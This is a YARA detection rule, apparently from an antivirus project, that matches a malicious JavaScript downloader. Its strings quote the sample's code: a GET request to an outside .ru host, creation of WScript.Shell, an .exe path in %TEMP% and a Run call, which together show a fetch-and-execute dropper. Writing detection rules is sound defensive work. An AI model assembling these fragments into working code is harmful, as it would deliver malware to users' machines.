rule sig_20160330_5ebe9889e589ec047e6f51282dc6b048 {
  meta:
    description = "datamaliciousorder - file 20160330_5ebe9889e589ec047e6f51282dc6b048.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d1c24da4f3d07167f4d5f64696c0a0ad2c7729af548ba738561e52a1d12643d"

  strings:
    $s1  = "P0[RI](\"GET\", \"http://brand-obuv.ru/m3isud\", false);" fullword ascii
    $s2  = "var X = function DC() {return WScript[V0](\"WScript\"+\".Shell\");}(), V1 = 11;" fullword ascii
    $s3  = "function V(B0, G){T0 = T0 * 1; return B0 - G;};" fullword ascii
    $s4  = "if (P0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PF() {return X[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NTpeKXX761EioaLJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function GL(){return ZE + \"\";};" fullword ascii
    $s7  = "function T(M){X[\"Run\"](M, T0, T0);};" fullword ascii
    $s8  = "function XI() {return ((S0 == true) && (S0 == YN)) ? 1 : T0;};" fullword ascii
    $s9  = "function TL()" fullword ascii
    $s10 = "function S(){return 22;};" fullword ascii
    $s11 = "function MT(JD) {var H = (1, 2, 3, 4, 5, JD); return H;};" fullword ascii
    $s12 = "}while (HH);" fullword ascii
    $s13 = "var UU = new this[\"Date\"]();" fullword ascii
    $s14 = "return V(F, B);" fullword ascii
    $s15 = "function P(){return V0;};" fullword ascii
    $s16 = "var S0 = false;" fullword ascii
    $s17 = "S0 = true; " fullword ascii
    $s18 = "var YN = false;" fullword ascii
    $s19 = "YN = true; " fullword ascii
    $s20 = "} catch(S1){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}